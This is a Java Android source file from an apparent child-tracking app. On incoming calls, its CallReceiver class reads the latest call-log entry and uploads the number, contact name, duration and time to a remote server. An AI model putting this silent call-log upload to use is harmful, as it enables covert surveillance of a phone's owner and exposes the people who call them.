package com.infinity.childtracking.Receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;
import com.infinity.childtracking.api.APIResponse;
import com.infinity.childtracking.api.RetroAPI;
import com.infinity.childtracking.api.RetroClient;
import com.infinity.childtracking.model.CALL;
import java.text.SimpleDateFormat;
import java.util.Date;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class CallReceiver extends BroadcastReceiver {
    String status;
    Boolean isIncoing = false;
    Context context;
    CALL receivedCall;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {
        status = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        this.context = context;
        if(status.equals(TelephonyManager.EXTRA_STATE_IDLE)){
            Log.d("CALLSEND","idle");
        }
        if(status.equals(TelephonyManager.EXTRA_STATE_RINGING)){
            isIncoing = true;
            Log.d("CALLSEND","ringing "+ isIncoing );
        }
        if(status.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)){
            Log.d("CALLSEND","took up");
        }
        if(isIncoing){
            getCALL();
        }
    }

    private void getCALL() {
        Uri uri = Uri.parse("content://call_log/calls");
        Cursor c = context.getContentResolver().query(uri, null, null, null, CallLog.Calls.DATE + " DESC limit 1");
        while (c.moveToNext()) {
            String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
            String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
            long seconds = Long.parseLong(c.getString(c.getColumnIndex(CallLog.Calls.DATE)));
            int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));
            SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yy HH:mm");
            String datetime = dateFormat.format(new Date(seconds));
            if(name==null)
                name = number;
            receivedCall = new CALL(number, name, duration, type,datetime);
            Log.d("CALLSEND",receivedCall.toString());
            break;
        }
        sendReq();
    }

    private void sendReq() {
        Retrofit retrofit = RetroClient.getRetrofit();
        RetroAPI retroAPI = retrofit.create(RetroAPI.class);

        Call<APIResponse> res = retroAPI.sendCall(receivedCall);
        res.enqueue(new Callback<APIResponse>() {
            @Override
            public void onResponse(Call<APIResponse> call, Response<APIResponse> response) {
                Log.d("CALLSEND","Resonse");
            }

            @Override
            public void onFailure(Call<APIResponse> call, Throwable t) {
                Log.d("CALLSEND","Failure");
            }
        });
    }
}
